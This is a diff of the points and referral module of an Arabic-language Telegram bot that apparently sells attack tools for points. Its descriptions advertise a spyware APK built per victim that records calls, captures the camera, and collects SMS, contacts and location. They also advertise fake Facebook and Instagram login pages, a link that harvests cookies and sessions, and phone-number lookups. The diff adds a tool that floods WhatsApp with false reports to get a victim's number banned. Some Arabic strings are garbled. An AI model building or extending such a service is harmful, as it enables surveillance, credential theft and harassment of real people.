@@ -1,20 +1,17 @@
 # points_system.py
 # ============================================================
-# نظام النقاط + الإحالات
-# v3 — واجهة نظيفة + رسائل تأكيد الأدوات
+# الإحالات + نظام النقاط
+# v3 — رسائل تأكيد الأدوات + واجهة نظيفة
 # ============================================================
-
 import html
 import json
 import time
 import random
 import string
 from datetime import datetime
-
 from telebot.types import (
     InlineKeyboardMarkup, InlineKeyboardButton,
 )
-
 from logging_config import get_logger
 from monitoring import metrics
 
@@ -41,14 +38,13 @@ def h(text):
 # [1] الإعدادات
 # ============================================================
 ADMIN_IDS = [7631249810]
-
 WELCOME_POINTS = 25
 REFERRAL_POINTS = 10
 REFERRAL_BONUS_5 = 50
 REFERRAL_BONUS_10 = 150
 REFERRAL_BONUS_25 = 500
 
-# ─── أسعار الأدوات ───
+# ─── أسعار الأدوات
 TOOL_PRICES = {
     "apk": 50,
     "fb_site": 15,
@@ -56,35 +52,37 @@ TOOL_PRICES = {
     "silent": 20,
     "phone_search": 5,
     "profile_card": 10,
+    "wa_report": 15,          # ← أداة حظر واتساب
     "social_engineering": 0,
     "dashboard": 0,
 }
 
-# ─── أسماء الأدوات بالعربي ───
+# ─── أسماء الأدوات بالعربي
 TOOL_NAMES_AR = {
-    "apk": "📱 تطبيق الضحية (APK)",
+    "apk": "📱 ( تطبيق الضحية APK)",
     "fb_site": "📘 رابط مصيدة فيسبوك",
     "ig_site": "📷 رابط مصيدة انستقرام",
     "silent": "🎯 Silent Collector",
     "phone_search": "📱 بحث رقم هاتف",
     "profile_card": "🎨 Social Profile Card",
+    "wa_report": "🚫 حظر رقم واتساب",          # ← الأداة الجديدة
     "social_engineering": "🎭 الهندسة الاجتماعية",
     "dashboard": "🌐 لوحة التحكم",
 }
 
-# ─── شرح كل أداة (لما المستخدم يدوس عليها) ───
+# ─── شرح كل أداة
 TOOL_DESCRIPTIONS = {
     "apk": (
-        "📱 <b>تطبيق الضحية (APK)</b>\n"
+        "📱 <b>( تطبيق الضحية APK)</b>\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
-        "🎯 <b>الوظيفة:</b>\n"
-        "تبني APK مخصص لكل ضحية، لما الضحية تثبته:\n"
+        "🎯 <b>:الوظيفة</b>\n"
+        " تبنيAPK :مخصص لكل ضحية، لما الضحية تثبته\n"
         "• تستقبل صور من كاميرتها\n"
         "• تسجل صوت ومكالمات\n"
         "• تستقبل رسائل SMS\n"
         "• تجيب جهات الاتصال والموقع\n"
         "• 40+ أمر للتحكم الكامل\n\n"
-        "⚙️ <b>طريقة الاستخدام:</b>\n"
+        "⚙️ <b>:طريقة الاستخدام</b>\n"
         "1. اكتب اسم الضحية\n"
         "2. البوت يبني APK تلقائياً\n"
         "3. ابعت الـ APK للضحية\n"
@@ -93,16 +91,16 @@ TOOL_DESCRIPTIONS = {
     "fb_site": (
         "📘 <b>رابط مصيدة فيسبوك</b>\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
-        "🎯 <b>الوظيفة:</b>\n"
-        "صفحة تسجيل دخول فيسبوك مزيفة تشبه الأصل 95%.\n"
+        "🎯 <b>:الوظيفة</b>\n"
+        "95% صفحة تسجيل دخول فيسبوك مزيفة تشبه الأصل.\n"
         "لما الضحية تدخل بياناتها، توصلك فوراً.\n\n"
-        "📋 <b>الأنواع المتاحة:</b> 10 قوالب\n"
+        "📋 <b>:الأنواع المتاحة</b> 10 قوالب\n"
         "• تسجيل دخول\n"
         "• استرداد حساب\n"
         "• تحقق OTP\n"
         "• Ads Manager\n"
         "• وغيرها...\n\n"
-        "⚙️ <b>طريقة الاستخدام:</b>\n"
+        "⚙️ <b>:طريقة الاستخدام</b>\n"
         "1. اختر القالب المناسب\n"
         "2. انسخ الرابط\n"
         "3. ابعته للضحية\n"
@@ -111,10 +109,10 @@ TOOL_DESCRIPTIONS = {
     "ig_site": (
         "📷 <b>رابط مصيدة انستقرام</b>\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
-        "🎯 <b>الوظيفة:</b>\n"
+        "🎯 <b>:الوظيفة</b>\n"
         "صفحة انستقرام مزيفة بتصميم احترافي.\n"
         "10 قوالب مختلفة (مسابقة، توثيق، إلخ)\n\n"
-        "⚙️ <b>طريقة الاستخدام:</b>\n"
+        "⚙️ <b>:طريقة الاستخدام</b>\n"
         "1. اختر القالب\n"
         "2. انسخ الرابط\n"
         "3. ابعته للضحية\n\n"
@@ -122,14 +120,14 @@ TOOL_DESCRIPTIONS = {
     "silent": (
         "🎯 <b>Silent Collector</b>\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
-        "🎯 <b>الوظيفة:</b>\n"
+        "🎯 <b>:الوظيفة</b>\n"
         "رابط يفتح صفحة تحميل عادية، وبنجمع:\n"
         "• IP + بصمة الجهاز\n"
         "• الكوكيز والتخزين\n"
         "• الجلسات النشطة (FB, IG, Google...)\n"
         "• Autofill Hijack (اسم، إيميل، هاتف)\n"
         "• كاميرا (لو وافق)\n\n"
-        "⚙️ <b>طريقة الاستخدام:</b>\n"
+        "⚙️ <b>:طريقة الاستخدام</b>\n"
         "1. اكتب اسم للضحية\n"
         "2. انسخ الرابط\n"
         "3. ابعته للضحية\n"
@@ -138,14 +136,14 @@ TOOL_DESCRIPTIONS = {
     "phone_search": (
         "📱 <b>بحث برقم الهاتف</b>\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
-        "🎯 <b>الوظيفة:</b>\n"
+        "🎯 <b>:الوظيفة</b>\n"
         "بحث شامل عن رقم هاتف من 6 مصادر:\n"
         "• اسم صاحب الرقم\n"
         "• الدولة والمحافظة\n"
         "• شركة الاتصال\n"
         "• حسابات مرتبطة (FB, IG, WhatsApp)\n"
         "• Google Dorks\n\n"
-        "⚙️ <b>طريقة الاستخدام:</b>\n"
+        "⚙️ <b>:طريقة الاستخدام</b>\n"
         "1. اكتب رقم الهاتف\n"
         "2. انتظر التحليل\n"
         "3. النتيجة كاملة\n\n"
@@ -153,32 +151,52 @@ TOOL_DESCRIPTIONS = {
     "profile_card": (
         "🎨 <b>Social Profile Card</b>\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
-        "🎯 <b>الوظيفة:</b>\n"
+        "🎯 <b>:الوظيفة</b>\n"
         "بروفايل احترافي بأزرار تواصل شغالة.\n"
         "الضحية تشوف البروفايل، تقدر ترفع صورها.\n\n"
-        "⚙️ <b>طريقة الاستخدام:</b>\n"
+        "⚙️ <b>:طريقة الاستخدام</b>\n"
         "1. أدخل 10 حقول (اسم، هاتف، إلخ)\n"
         "2. انسخ الرابط\n"
         "3. ابعته للضحية\n\n"
     ),
+    "wa_report": (
+        "🚫 <b>حظر رقم واتساب</b>\n"
+        "━━━━━━━━━━━━━━━━━━\n\n"
+        "🎯 <b>:الوظيفة</b>\n"
+        "توليد بلاغ رسمي قوي ومتنوع لواتساب\n"
+        "عن طريق إيميلك الشخصي\n\n"
+        "📋 <b>:الخطوات</b>\n"
+        "1. ابعت رقم الضحية\n"
+        "2. اختر سبب البلاغ (سبام/نصب/مضايقة...)\n"
+        "3. البوت هيولّدلك 25 قالب قوي ومتنوع\n"
+        "4. اضغط زر الإرسال → يفتح Gmail\n"
+        "5. اضغط Send فقط ✅\n\n"
+        "⚡ <b>:للحصول على حظر سريع</b>\n"
+        "• كرر العملية من 3-5 إيميلات مختلفة\n"
+        "• لا تعدّل النص (عشان البلاغ يبقى موثوق)\n"
+        "• كرر كل 3 أيام لو مفيش نتيجة\n\n"
+        "⏰ <b>مدة الحظر:</b> 24-72 ساعة\n"
+        "📊 <b>معدل النجاح:</b> 60-80%\n"
+        "💰 <b>السعر:</b> 15 نقطة"
+    ),
     "social_engineering": (
         "🎭 <b>الهندسة الاجتماعية</b>\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
-        "🎯 <b>الوظيفة:</b>\n"
-        "قوالب رسائل جاهزة (واتساب + إيميل)\n"
+        "🎯 <b>:الوظيفة</b>\n"
+        "قوالب رسائل جاهزة (واتساب + إيميل):\n"
         "• 10 قوالب واتساب\n"
         "• 10 قوالب إيميل\n\n"
-        "✅ <b>مجاناً 100%</b>\n\n"
+        "✅ <b>100% مجاناً</b>\n\n"
     ),
     "dashboard": (
         "🌐 <b>لوحة التحكم الويب</b>\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
-        "🎯 <b>الوظيفة:</b>\n"
+        "🎯 <b>:الوظيفة</b>\n"
         "تحكم في كل ضحاياك من المتصفح:\n"
         "• قائمة الضحايا\n"
         "• إرسال أوامر مباشرة\n"
         "• إحصائيات مفصلة\n\n"
-        "✅ <b>مجاناً 100%</b>\n\n"
+        "✅ <b>100% مجاناً</b>\n\n"
     ),
 }
 
@@ -189,27 +207,21 @@ TOOL_DESCRIPTIONS = {
 def _user_key(user_id):
     return f"user:{user_id}"
 
-
 def _referral_key(code):
     return f"referral:{code}"
-
 
 def _referral_count_key(user_id):
     return f"referral_count:{user_id}"
 
-
 def _user_referrals_key(user_id):
     return f"user_referrals:{user_id}"
-
 
 def _generate_ref_code():
     chars = string.ascii_lowercase + string.digits
     return ''.join(random.choices(chars, k=8))
 
-
 def is_admin(user_id):
     return int(user_id) in ADMIN_IDS
-
 
 def is_vip(user_id):
     user = get_user(user_id)
@@ -244,8 +256,7 @@ def save_user(user_id, data):
         return False
 
 
-def create_new_user(user_id, username="Unknown", first_name="User",
-                    referred_by=None):
+def create_new_user(user_id, username="Unknown", first_name="User", referred_by=None):
     ref_code = _generate_ref_code()
     attempts = 0
     while redis_client.get(_referral_key(ref_code)) and attempts < 10:
@@ -268,7 +279,6 @@ def create_new_user(user_id, username="Unknown", first_name="User",
         "notes": "",
         "history": [],
     }
-
     save_user(user_id, user)
 
     if redis_client:
@@ -282,12 +292,10 @@ def create_new_user(user_id, username="Unknown", first_name="User",
 
     logger.info(f"New user created: {user_id} | ref_code={ref_code}")
     metrics.inc_counter("users_registered")
-
     return user
 
 
-def get_or_create_user(user_id, username="Unknown", first_name="User",
-                       referred_by=None):
+def get_or_create_user(user_id, username="Unknown", first_name="User", referred_by=None):
     user = get_user(user_id)
     if not user:
         user = create_new_user(user_id, username, first_name, referred_by)
@@ -381,7 +389,6 @@ def _add_referral_points(referrer_id, new_user_id, new_user_name):
 
         bonus = 0
         count = referrer["referral_count"]
-
         if count == 5:
             bonus = REFERRAL_BONUS_5
         elif count == 10:
@@ -412,10 +419,8 @@ def _add_referral_points(referrer_id, new_user_id, new_user_name):
                     f"📊 <b>إجمالي إحالاتك:</b> {count}\n"
                     f"💎 <b>رصيدك:</b> {referrer['points']} نقطة"
                 )
-
                 if bonus > 0:
                     msg += f"\n\n🎁 <b>مكافأة {count} إحالات!</b>\n+{bonus} نقطة إضافية"
-
                 bot.send_message(referrer_id, msg, parse_mode="HTML")
             except Exception as e:
                 logger.warning(f"notify referrer error: {e}")
@@ -429,7 +434,6 @@ def _add_referral_points(referrer_id, new_user_id, new_user_name):
 
         logger.info(f"Referral: {referrer_id} ← {new_user_id} | +{REFERRAL_POINTS} points")
         metrics.inc_counter("referrals")
-
     except Exception as e:
         logger.exception(f"_add_referral_points error: {e}")
 
@@ -471,7 +475,6 @@ def add_points(user_id, amount, reason="", admin_action=False):
         user = get_or_create_user(user_id)
         user["points"] = user.get("points", 0) + amount
         user["total_points_earned"] = user.get("total_points_earned", 0) + amount
-
         user["history"] = user.get("history", [])
         user["history"].append({
             "type": "add_points",
@@ -481,7 +484,6 @@ def add_points(user_id, amount, reason="", admin_action=False):
             "date": datetime.utcnow().isoformat(),
         })
         user["history"] = user["history"][-50:]
-
         save_user(user_id, user)
         logger.info(f"Points added: {user_id} | +{amount} | {reason}")
         return True
@@ -498,7 +500,6 @@ def remove_points(user_id, amount, reason=""):
         current = user.get("points", 0)
         user["points"] = max(0, current - amount)
         user["total_points_spent"] = user.get("total_points_spent", 0) + amount
-
         user["history"] = user.get("history", [])
         user["history"].append({
             "type": "remove_points",
@@ -507,7 +508,6 @@ def remove_points(user_id, amount, reason=""):
             "date": datetime.utcnow().isoformat(),
         })
         user["history"] = user["history"][-50:]
-
         save_user(user_id, user)
         return True
     except Exception as e:
@@ -522,7 +522,6 @@ def set_points(user_id, amount, reason=""):
         user = get_or_create_user(user_id)
         old_points = user.get("points", 0)
         user["points"] = max(0, amount)
-
         user["history"] = user.get("history", [])
         user["history"].append({
             "type": "set_points",
@@ -532,7 +531,6 @@ def set_points(user_id, amount, reason=""):
             "date": datetime.utcnow().isoformat(),
         })
         user["history"] = user["history"][-50:]
-
         save_user(user_id, user)
         return True
     except Exception as e:
@@ -556,7 +554,6 @@ def can_use_tool(user_id, tool):
         return {"allowed": True, "reason": "vip", "cost": 0, "balance": user.get("points", 0)}
 
     cost = TOOL_PRICES.get(tool, 0)
-
     if cost == 0:
         return {"allowed": True, "reason": "free", "cost": 0, "balance": user.get("points", 0)}
 
@@ -590,18 +587,15 @@ def consume_usage(user_id, tool):
         return True
 
     cost = TOOL_PRICES.get(tool, 0)
-
     if cost == 0:
         return True
 
     balance = user.get("points", 0)
-
     if balance < cost:
         return False
 
     user["points"] = balance - cost
     user["total_points_spent"] = user.get("total_points_spent", 0) + cost
-
     user["history"] = user.get("history", [])
     user["history"].append({
         "type": "tool_used",
@@ -611,12 +605,10 @@ def consume_usage(user_id, tool):
         "date": datetime.utcnow().isoformat(),
     })
     user["history"] = user["history"][-50:]
-
     save_user(user_id, user)
 
     logger.info(f"Tool used: {user_id} | {tool} | -{cost} points")
     metrics.inc_counter("tools_used", tags={"tool": tool})
-
     return True
 
 
@@ -624,22 +616,19 @@ def consume_usage(user_id, tool):
 # [7] ★★★ رسالة تأكيد الأداة ★★★
 # ============================================================
 def build_tool_confirm_text(user_id, tool):
-    """
-    يبني رسالة تأكيد الخصم لما المستخدم يدوس على أداة
-    """
+    """يبني رسالة تأكيد الخصم"""
     user = get_or_create_user(user_id)
     points = user.get("points", 0)
     cost = TOOL_PRICES.get(tool, 0)
     tool_name = TOOL_NAMES_AR.get(tool, tool)
     description = TOOL_DESCRIPTIONS.get(tool, f"🎯 <b>{tool_name}</b>\n\n")
 
-    # ─── رصيد كافي؟ ───
     if cost == 0:
         confirm_line = "✅ <b>الأداة مجانية!</b>"
         can_proceed = True
     elif is_admin(user_id) or user.get("is_vip"):
         confirm_line = (
-            f"👑 <b>أنت {'أدمن' if is_admin(user_id) else 'VIP'}</b>\n"
+            f"👑 <b>أنت {'' if is_admin(user_id) else 'VIP'} أدمن</b>\n"
             f"✅ <b>الخصم: مجاني</b>"
         )
         can_proceed = True
@@ -662,20 +651,17 @@ def build_tool_confirm_text(user_id, tool):
         )
         can_proceed = False
 
-    # ─── نص الرسالة ───
     text = (
         f"{description}"
-        f"━━━ 💰 الخصم ━━━\n"
+        f"━━━ 💰 ━━━ الخصم\n"
         f"{confirm_line}"
     )
-
     return text, can_proceed
 
 
 def build_tool_confirm_keyboard(tool, can_proceed=True):
     """أزرار تأكيد أو إلغاء"""
     m = InlineKeyboardMarkup()
-
     if can_proceed:
         m.row(
             InlineKeyboardButton(
@@ -694,13 +680,12 @@ def build_tool_confirm_keyboard(tool, can_proceed=True):
                 callback_data="points_menu"
             ),
         )
-        m.row(
-            InlineKeyboardButton(
-                "🔙 رجوع",
-                callback_data="back_to_main"
-            ),
-        )
-
+    m.row(
+        InlineKeyboardButton(
+            "🔙 رجوع",
+            callback_data="back_to_main"
+        ),
+    )
     return m
 
 
@@ -708,15 +693,15 @@ def build_tool_confirm_keyboard(tool, can_proceed=True):
 # [8] ★★★ الواجهة الرئيسية النظيفة ★★★
 # ============================================================
 def build_main_menu_keyboard(user_id):
-    """القائمة الرئيسية — نظيفة بدون شرح البوت"""
+    """القائمة الرئيسية — نظيفة"""
     m = InlineKeyboardMarkup()
-
     m.add(InlineKeyboardButton("👥 إدارة الضحايا", callback_data="v_list"))
-    m.add(InlineKeyboardButton("📱 تطبيق الضحية (APK)", callback_data="v_new"))
-    m.add(InlineKeyboardButton("🌐 لوحة التحكم (ويب)", callback_data="open_dashboard"))
+    m.add(InlineKeyboardButton("📱 ( تطبيق الضحية APK)", callback_data="v_new"))
+    m.add(InlineKeyboardButton("🚫 حظر رقم واتساب", callback_data="wa_report_start"))  # ← جديد
+    m.add(InlineKeyboardButton("🌐 ( لوحة التحكم )ويب", callback_data="open_dashboard"))
     m.add(InlineKeyboardButton("🎭 الهندسة الاجتماعية", callback_data="gen_se"))
     m.add(InlineKeyboardButton("🔍 محرك البحث", callback_data="search_menu"))
-    m.add(InlineKeyboardButton("🎯 جمع المعلومات (Silent)", callback_data="gen_silent"))
+    m.add(InlineKeyboardButton("🎯 ( جمع المعلومات Silent)", callback_data="gen_silent"))
     m.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
     m.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
 
@@ -727,33 +712,32 @@ def build_main_menu_keyboard(user_id):
         m.add(InlineKeyboardButton("👑 لوحة تحكم الأدمن", callback_data="admin_panel"))
 
     return m
+
+
 # ============================================================
 # [9] ★★★ لوحة الإعدادات ⚙️ ★★★
 # ============================================================
 def build_settings_menu_keyboard(user_id):
     """قائمة الإعدادات"""
     m = InlineKeyboardMarkup()
-
     m.add(InlineKeyboardButton("💰 نقاطي والإحالات", callback_data="points_menu"))
     m.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
     m.add(InlineKeyboardButton("📖 شرح البوت", callback_data="help_guide"))
     m.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
-
     return m
 
 
 def build_settings_menu_text(user_id):
-    """نص الإعدادات — نظرة سريعة على رصيدك"""
+    """نص الإعدادات"""
     user = get_or_create_user(user_id)
     points = user.get("points", 0)
     ref_count = user.get("referral_count", 0)
-
     return (
         "⚙️ <b>الإعدادات</b>\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
         f"💰 <b>نقاطك:</b> <code>{points}</code>\n"
         f"🎁 <b>إحالاتك:</b> <code>{ref_count}</code>\n\n"
-        "اختر من الأزرار أدناه:"
+        ":اختر من الأزرار أدناه"
     )
 
 
@@ -802,19 +786,15 @@ def build_points_menu_text(user_id):
     return (
         f"💰 <b>نظام النقاط</b>\n"
         f"━━━━━━━━━━━━━━━━━━\n\n"
-
         f"💎 <b>رصيدك الحالي:</b> <code>{points}</code> نقطة\n"
         f"📈 <b>إجمالي ما كسبته:</b> <code>{total_earned}</code>\n"
         f"📉 <b>إجمالي ما صرفته:</b> <code>{total_spent}</code>\n\n"
-
-        f"━━━ 🎁 الإحالات ━━━\n"
+        f"━━━ 🎁 ━━━ الإحالات\n"
         f"👥 <b>عدد إحالاتك:</b> <code>{ref_count}</code>\n"
         f"🔗 <b>كودك:</b> <code>{ref_code}</code>\n\n"
         f"{next_bonus}\n\n"
-
-        f"━━━ 🔗 رابطك الخاص ━━━\n"
+        f"━━━ 🔗 ━━━ رابطك الخاص\n"
         f"<code>{ref_link}</code>\n\n"
-
         f"💡 <i>شارك الرابط → كل واحد يخش = +{REFERRAL_POINTS} نقطة</i>"
     )
 
@@ -840,10 +820,8 @@ def build_my_account_text(user_id):
         f"🆔 <b>الآيدي:</b> <code>{user_id}</code>\n"
         f"👋 <b>الاسم:</b> {h(user.get('first_name', 'Unknown'))}\n"
         f"📝 <b>Username:</b> @{h(user.get('username', 'N/A'))}\n\n"
-
         f"📊 <b>الحالة:</b> {status}\n"
         f"📅 <b>التسجيل:</b> <code>{created}</code>\n\n"
-
         f"💰 <b>رصيدك:</b> <code>{points}</code> نقطة\n"
         f"🎁 <b>إحالاتك:</b> <code>{ref_count}</code>\n"
     )
@@ -857,7 +835,6 @@ def build_points_history_text(user_id, limit=10):
         return "📊 <b>سجل المعاملات</b>\n\n<i>لا يوجد معاملات بعد</i>"
 
     lines = ["📊 <b>سجل المعاملات</b>\n━━━━━━━━━━━━━━━━━━\n"]
-
     for item in reversed(history):
         h_type = item.get("type", "")
         date_str = item.get("date", "")[:19].replace("T", " ")
@@ -865,28 +842,22 @@ def build_points_history_text(user_id, limit=10):
 
         if h_type == "referral":
             name = item.get("user_name", "Unknown")
-            lines.append(f"🎁 <b>إحالة جديدة</b> - {h(name)}\n   <code>+{points} نقطة</code> • {date_str}")
-
+            lines.append(f"🎁 <b>إحالة جديدة</b> - {h(name)}\n  <code>+{points} نقطة</code> • {date_str}")
         elif h_type == "referral_bonus":
             count = item.get("count", 0)
-            lines.append(f"🏆 <b>مكافأة {count} إحالات</b>\n   <code>+{points} نقطة</code> • {date_str}")
-
+            lines.append(f"🏆 <b>مكافأة {count} إحالات</b>\n  <code>+{points} نقطة</code> • {date_str}")
         elif h_type == "tool_used":
             tool_name = item.get("tool_name", "أداة")
             cost = item.get("cost", 0)
-            lines.append(f"🔧 <b>{h(tool_name)}</b>\n   <code>-{cost} نقطة</code> • {date_str}")
-
+            lines.append(f"🔧 <b>{h(tool_name)}</b>\n  <code>-{cost} نقطة</code> • {date_str}")
         elif h_type == "add_points":
             reason = item.get("reason", "منحة")
-            lines.append(f"➕ <b>{h(reason)}</b>\n   <code>+{points} نقطة</code> • {date_str}")
-
+            lines.append(f"➕ <b>{h(reason)}</b>\n  <code>+{points} نقطة</code> • {date_str}")
         elif h_type == "remove_points":
             reason = item.get("reason", "خصم")
-            lines.append(f"➖ <b>{h(reason)}</b>\n   <code>{points} نقطة</code> • {date_str}")
-
+            lines.append(f"➖ <b>{h(reason)}</b>\n  <code>{points} نقطة</code> • {date_str}")
         elif h_type == "set_points":
-            lines.append(f"⚙️ <b>تعديل الرصيد</b>\n   <code>{item.get('old', 0)} → {item.get('new', 0)}</code> • {date_str}")
-
+            lines.append(f"⚙️ <b>تعديل الرصيد</b>\n  <code>{item.get('old', 0)} → {item.get('new', 0)}</code> • {date_str}")
         lines.append("")
 
     return "\n".join(lines)
@@ -907,14 +878,12 @@ def build_my_referrals_text(user_id, limit=20):
         f"👥 <b>قائمة إحالاتي ({len(referrals)})</b>",
         "━━━━━━━━━━━━━━━━━━\n",
     ]
-
     for i, ref in enumerate(referrals, 1):
         name = ref.get("first_name", "Unknown")[:20]
         username = ref.get("username", "")
         created = ref.get("created_at", "")[:10]
-
         username_text = f" @{username}" if username else ""
-        lines.append(f"{i}. <b>{h(name)}</b>{h(username_text)}\n   📅 {created}")
+        lines.append(f"{i}. <b>{h(name)}</b>{h(username_text)}\n  📅 {created}")
 
     return "\n".join(lines)
 
@@ -923,18 +892,16 @@ def build_how_to_earn_text():
     return (
         "💎 <b>كيف تكسب نقاط؟</b>\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
-
         "🎁 <b>1. نقاط الترحيب:</b>\n"
-        f"   • {WELCOME_POINTS} نقطة مجاناً أول ما تسجل\n\n"
-
+        f" • {WELCOME_POINTS} نقطة مجاناً أول ما تسجل\n\n"
         "👥 <b>2. الإحالات (الأسرع):</b>\n"
-        f"   • كل مستخدم جديد يدخل من رابطك = <b>+{REFERRAL_POINTS} نقطة</b>\n"
-        f"   • عند 5 إحالات = <b>+{REFERRAL_BONUS_5} نقطة إضافية</b>\n"
-        f"   • عند 10 إحالات = <b>+{REFERRAL_BONUS_10} نقطة إضافية</b>\n"
-        f"   • عند 25 إحالة = <b>+{REFERRAL_BONUS_25} نقطة إضافية</b>\n\n"
-
-        "━━━ 💰 أسعار الأدوات ━━━\n"
-        f"📱 <b>APK ضحية:</b> {TOOL_PRICES['apk']} نقطة\n"
+        f" • كل مستخدم جديد يدخل من رابطك = <b>+{REFERRAL_POINTS} نقطة</b>\n"
+        f" • عند 5 إحالات = <b>+{REFERRAL_BONUS_5} نقطة إضافية</b>\n"
+        f" • عند 10 إحالات = <b>+{REFERRAL_BONUS_10} نقطة إضافية</b>\n"
+        f" • عند 25 إحالة = <b>+{REFERRAL_BONUS_25} نقطة إضافية</b>\n\n"
+        "━━━ 💰 ━━━ أسعار الأدوات\n"
+        f"📱 <b>APK (ضحية):</b> {TOOL_PRICES['apk']} نقطة\n"
+        f"🚫 <b>حظر رقم واتساب:</b> {TOOL_PRICES['wa_report']} نقطة\n"
         f"📘 <b>رابط فيسبوك:</b> {TOOL_PRICES['fb_site']} نقطة\n"
         f"📷 <b>رابط انستقرام:</b> {TOOL_PRICES['ig_site']} نقطة\n"
         f"🎯 <b>Silent Collector:</b> {TOOL_PRICES['silent']} نقطة\n"
@@ -942,10 +909,9 @@ def build_how_to_earn_text():
         f"🎨 <b>Profile Card:</b> {TOOL_PRICES['profile_card']} نقطة\n"
         f"🎭 <b>الهندسة الاجتماعية:</b> مجاناً\n"
         f"🌐 <b>لوحة التحكم:</b> مجاناً\n\n"
-
         "💡 <b>مثال:</b>\n"
-        "10 إحالات = 100 + 50 = <b>150 نقطة</b>\n"
-        "= 3 APK + 5 Silent + 10 بحث رقم"
+        "10 إحالات = 100 + 50 = 150 نقطة\n"
+        "= 3 APK + 5 Silent + 5 بحث رقم"
     )
 
 
@@ -954,11 +920,9 @@ def build_how_to_earn_text():
 # ============================================================
 def build_admin_stats_text():
     users = get_all_users()
-
     total_users = len(users)
     banned = sum(1 for u in users if u.get("is_banned"))
     vips = sum(1 for u in users if u.get("is_vip"))
-
     total_points_in_circulation = sum(u.get("points", 0) for u in users)
     total_earned = sum(u.get("total_points_earned", 0) for u in users)
     total_spent = sum(u.get("total_points_spent", 0) for u in users)
@@ -974,22 +938,18 @@ def build_admin_stats_text():
     return (
         f"📊 <b>إحصائيات النظام</b>\n"
         f"━━━━━━━━━━━━━━━━━━\n\n"
-
-        f"━━━ 👥 المستخدمون ━━━\n"
+        f"━━━ 👥 ━━━ المستخدمون\n"
         f"📊 <b>الإجمالي:</b> <code>{total_users}</code>\n"
         f"🆕 <b>آخر 24 ساعة:</b> <code>{recent}</code>\n"
         f"💎 <b>VIP:</b> <code>{vips}</code>\n"
         f"🚫 <b>محظورين:</b> <code>{banned}</code>\n\n"
-
-        f"━━━ 💰 النقاط ━━━\n"
+        f"━━━ 💰 ━━━ النقاط\n"
         f"💎 <b>في التداول:</b> <code>{total_points_in_circulation}</code>\n"
         f"📈 <b>إجمالي مكتسب:</b> <code>{total_earned}</code>\n"
         f"📉 <b>إجمالي مصروف:</b> <code>{total_spent}</code>\n\n"
-
-        f"━━━ 🎁 الإحالات ━━━\n"
+        f"━━━ 🎁 ━━━ الإحالات\n"
         f"👥 <b>إجمالي الإحالات:</b> <code>{total_referrals}</code>\n"
         f"📊 <b>معدل:</b> <code>{round(total_referrals / max(total_users, 1), 2)}</code> إحالة/مستخدم\n\n"
-
-        f"━━━ 👑 الأدمن ━━━\n"
+        f"━━━ 👑 ━━━ الأدمن\n"
         f"<code>{len(ADMIN_IDS)}</code>"
-                        )
+    )
